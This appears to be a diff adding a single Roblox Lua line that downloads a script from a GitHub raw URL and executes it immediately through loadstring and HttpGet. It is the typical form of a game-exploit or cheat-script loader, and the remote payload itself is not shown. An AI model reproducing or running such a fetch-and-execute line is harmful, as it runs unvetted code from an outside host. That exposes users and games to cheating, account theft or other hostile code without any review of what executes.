@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/anhem-250311/D-les-/refs/heads/main/D-les.txt"))()
